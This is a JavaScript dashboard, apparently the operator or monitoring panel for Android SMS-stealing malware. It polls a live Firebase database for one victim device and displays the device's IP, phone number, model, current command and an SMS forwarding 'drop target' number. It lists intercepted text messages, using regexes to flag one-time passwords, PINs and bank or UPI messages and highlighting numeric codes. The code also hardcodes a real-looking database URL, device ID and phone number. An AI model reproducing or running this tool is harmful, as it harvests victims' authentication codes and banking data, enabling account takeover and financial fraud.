/**
 * Hacker Tracker - Fast, Minimal, Functional Device Monitor
 * Target: 03e768e104ef026d
 * Strict Read-Only: ONLY HTTP GET
 */

const CONFIG = {
  deviceId: '03e768e104ef026d',
  firebaseBase: 'https://r-cha-222-default-rtdb.firebaseio.com',
  pageSize: 30,
};

const state = {
  allMessages: [],
  filteredMessages: [],
  activeFilter: 'all',
  searchQuery: '',
  page: 1,
  timer: null,
};

// DOM references
const dom = {
  copyIdBtn: document.getElementById('copyIdBtn'),
  copyHint: document.getElementById('copyHint'),
  statusPill: document.getElementById('statusPill'),
  statusText: document.getElementById('statusText'),
  lastUpdated: document.getElementById('lastUpdated'),
  refreshBtn: document.getElementById('refreshBtn'),
  autoRefreshCheck: document.getElementById('autoRefreshCheck'),
  batteryVal: document.getElementById('batteryVal'),
  ipVal: document.getElementById('ipVal'),
  phoneVal: document.getElementById('phoneVal'),
  modelVal: document.getElementById('modelVal'),
  cmdVal: document.getElementById('cmdVal'),
  livenessVal: document.getElementById('livenessVal'),
  dropTargetVal: document.getElementById('dropTargetVal'),
  messagesList: document.getElementById('messagesList'),
  searchInput: document.getElementById('searchInput'),
  clearSearch: document.getElementById('clearSearch'),
  countAll: document.getElementById('countAll'),
  countOtp: document.getElementById('countOtp'),
  countBank: document.getElementById('countBank'),
  footerCount: document.getElementById('footerCount'),
  prevBtn: document.getElementById('prevBtn'),
  nextBtn: document.getElementById('nextBtn'),
  pageLabel: document.getElementById('pageLabel'),
};

document.addEventListener('DOMContentLoaded', () => {
  initEvents();
  fetchData();
  startAutoRefresh();
});

function initEvents() {
  dom.refreshBtn.addEventListener('click', () => fetchData());
  dom.autoRefreshCheck.addEventListener('change', startAutoRefresh);

  dom.copyIdBtn.addEventListener('click', () => {
    navigator.clipboard.writeText(CONFIG.deviceId);
    dom.copyHint.textContent = 'COPIED!';
    setTimeout(() => { dom.copyHint.textContent = 'copy'; }, 1500);
  });

  dom.searchInput.addEventListener('input', (e) => {
    state.searchQuery = e.target.value.trim().toLowerCase();
    dom.clearSearch.style.display = state.searchQuery ? 'block' : 'none';
    state.page = 1;
    applyFilter();
  });

  dom.clearSearch.addEventListener('click', () => {
    dom.searchInput.value = '';
    state.searchQuery = '';
    dom.clearSearch.style.display = 'none';
    state.page = 1;
    applyFilter();
  });

  document.querySelectorAll('.filter-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      state.activeFilter = btn.dataset.filter;
      state.page = 1;
      applyFilter();
    });
  });

  dom.prevBtn.addEventListener('click', () => {
    if (state.page > 1) {
      state.page--;
      renderMessages();
    }
  });

  dom.nextBtn.addEventListener('click', () => {
    const totalPages = Math.ceil(state.filteredMessages.length / CONFIG.pageSize) || 1;
    if (state.page < totalPages) {
      state.page++;
      renderMessages();
    }
  });
}

function startAutoRefresh() {
  if (state.timer) clearInterval(state.timer);
  if (dom.autoRefreshCheck.checked) {
    state.timer = setInterval(fetchData, 15000);
  }
}

async function safeGet(url) {
  const ctrl = new AbortController();
  const tid = setTimeout(() => ctrl.abort(), 10000);
  const res = await fetch(url, { method: 'GET', signal: ctrl.signal });
  clearTimeout(tid);
  if (!res.ok) throw new Error(`HTTP ${res.status}`);
  return await res.json();
}

async function fetchData() {
  dom.refreshBtn.disabled = true;
  dom.refreshBtn.textContent = '...';

  try {
    // 1. Fetch live endpoints
    const [client, cmd, userData, msgs] = await Promise.all([
      safeGet(`${CONFIG.firebaseBase}/clients/${CONFIG.deviceId}.json`).catch(() => null),
      safeGet(`${CONFIG.firebaseBase}/commands/${CONFIG.deviceId}.json`).catch(() => null),
      safeGet(`${CONFIG.firebaseBase}/user_data/${CONFIG.deviceId}.json`).catch(() => null),
      safeGet(`${CONFIG.firebaseBase}/messages/${CONFIG.deviceId}.json`).catch(() => null),
    ]);

    updateVitals(client, cmd, userData);
    processMessages(msgs);
    dom.lastUpdated.textContent = new Date().toLocaleTimeString();
  } catch (err) {
    console.warn('Live fetch error, falling back to local snapshot:', err);
    try {
      const fallback = await safeGet('data/latest.json');
      updateVitals(fallback.client || (fallback.raw && fallback.raw.client), null, null);
      const arch = await safeGet('data/messages_archive.json');
      processMessages(arch.messages || {});
      dom.lastUpdated.textContent = 'Archive snapshot';
    } catch (e) {
      dom.lastUpdated.textContent = 'Offline';
    }
  } finally {
    dom.refreshBtn.disabled = false;
    dom.refreshBtn.textContent = 'Refresh';
  }
}

function updateVitals(client, cmd, userData) {
  const isOnline = client && client.status === true;
  dom.statusPill.className = `status-pill ${isOnline ? 'online' : 'offline'}`;
  dom.statusText.textContent = isOnline ? 'Online' : 'Offline';

  dom.batteryVal.textContent = (client && client.battery) || '--';
  dom.ipVal.textContent = (client && client.ip_address) || '--';

  const carrier = (client && client.service_provider) || 'Airtel';
  const phone = (client && client.mobNo) || '--';
  dom.phoneVal.textContent = `${phone} (${carrier})`;

  const model = (client && client.modelName) || 'CPH2467';
  const os = client && client.androidV ? `Android ${client.androidV}` : '';
  dom.modelVal.textContent = `${model} ${os}`.trim();

  dom.cmdVal.textContent = (userData && userData.command) || 'forward status';

  const ping = (cmd && cmd.checkLiveness && cmd.checkLiveness.text) || 'ping';
  const pong = (client && client.webhookEvent && client.webhookEvent.checkLiveness && client.webhookEvent.checkLiveness.text) || 'pong';
  dom.livenessVal.textContent = `${ping} ⇄ ${pong}`;

  const whSms = client && client.webhookEvent && client.webhookEvent.sendSms;
  dom.dropTargetVal.textContent = (whSms && whSms.to) || '+919560241900';
}

function processMessages(rawMsgs) {
  if (!rawMsgs) return;

  const list = [];
  const otpRe = /\b(otp|code|pin|password|pswd|verification|verify)\b/i;
  const bankRe = /\b(upi|inr|rs\.?|debited|credited|balance|a\/c|account|bank|pnb|sbi|hdfc|icici)\b/i;

  let otpCount = 0;
  let bankCount = 0;

  for (const [key, val] of Object.entries(rawMsgs)) {
    if (!val || typeof val !== 'object') continue;
    const body = val.message || '';
    const sender = (val.sender || 'UNKNOWN').toUpperCase();

    const isOtp = otpRe.test(body);
    const isBank = bankRe.test(body) || sender.includes('PNB') || sender.includes('BANK');

    if (isOtp) otpCount++;
    if (isBank) bankCount++;

    list.push({
      id: val.id || key,
      sender: val.sender || 'UNKNOWN',
      message: body,
      time: val.dateTime || '',
      isOtp,
      isBank,
    });
  }

  // Sort newest first
  list.sort((a, b) => {
    const na = Number(a.id);
    const nb = Number(b.id);
    if (!isNaN(na) && !isNaN(nb)) return nb - na;
    return String(b.id).localeCompare(String(a.id));
  });

  state.allMessages = list;
  dom.countAll.textContent = list.length;
  dom.countOtp.textContent = otpCount;
  dom.countBank.textContent = bankCount;

  applyFilter();
}

function applyFilter() {
  const f = state.activeFilter;
  const q = state.searchQuery;

  state.filteredMessages = state.allMessages.filter(m => {
    if (f === 'otp' && !m.isOtp) return false;
    if (f === 'bank' && !m.isBank) return false;

    if (q) {
      const s = m.sender.toLowerCase();
      const b = m.message.toLowerCase();
      return s.includes(q) || b.includes(q) || (m.time && m.time.toLowerCase().includes(q));
    }
    return true;
  });

  renderMessages();
}

function highlightOtp(text) {
  const safe = (text || '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
  return safe.replace(/\b(\d{4,8})\b/g, '<span class="otp-tag">$1</span>');
}

function renderMessages() {
  const total = state.filteredMessages.length;
  const totalPages = Math.ceil(total / CONFIG.pageSize) || 1;

  if (state.page > totalPages) state.page = totalPages;
  if (state.page < 1) state.page = 1;

  const start = (state.page - 1) * CONFIG.pageSize;
  const end = Math.min(start + CONFIG.pageSize, total);
  const items = state.filteredMessages.slice(start, end);

  dom.footerCount.textContent = `Showing ${total === 0 ? 0 : start + 1} - ${end} of ${total} messages`;
  dom.pageLabel.textContent = `Page ${state.page} / ${totalPages}`;
  dom.prevBtn.disabled = state.page <= 1;
  dom.nextBtn.disabled = state.page >= totalPages;

  if (items.length === 0) {
    dom.messagesList.innerHTML = '<div class="empty">No messages found.</div>';
    return;
  }

  let html = '';
  for (const m of items) {
    const rowClass = m.isOtp ? 'msg-row is-otp' : (m.isBank ? 'msg-row is-bank' : 'msg-row');
    html += `
      <div class="${rowClass}">
        <span class="msg-time">${m.time}</span>
        <span class="msg-sender" title="${m.sender}">${m.sender}</span>
        <div class="msg-body">${highlightOtp(m.message)}</div>
        <button class="btn-copy-msg" onclick="copyText('${m.id}')" title="Copy SMS">Copy</button>
      </div>
    `;
  }

  dom.messagesList.innerHTML = html;
}

window.copyText = function(id) {
  const m = state.allMessages.find(item => String(item.id) === String(id));
  if (m) {
    navigator.clipboard.writeText(m.message);
  }
};
